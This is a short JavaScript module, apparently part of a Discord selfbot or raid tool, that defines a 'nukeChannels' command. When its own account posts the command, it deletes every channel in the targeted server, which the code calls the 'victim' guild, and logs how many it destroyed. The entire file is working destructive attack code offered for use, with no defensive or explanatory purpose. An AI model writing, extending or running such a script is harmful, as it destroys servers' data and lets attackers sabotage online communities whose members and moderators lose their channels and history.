const Logger = require('../utils/logger.js');

module.exports = async function nukeChannels(message, client) {
    await message.delete();
    if (message.author.id !== client.user.id) return;
    const victimGuild = message.guild;
    let nukedCount = 0;

    const victimChannels = victimGuild.channels.cache;

    for (const victimChannel of victimChannels.values()) {
        try {
            Logger.info(`Nuking channel: ${victimChannel.name}`);
            await victimChannel.delete();
            nukedCount++;
        } catch (error) {
            Logger.error(`Failed to delete channel: ${victimChannel.name}. Error: ${error.message}`);
        }
    }

    Logger.success(`Nuked ${nukedCount} channels`);
};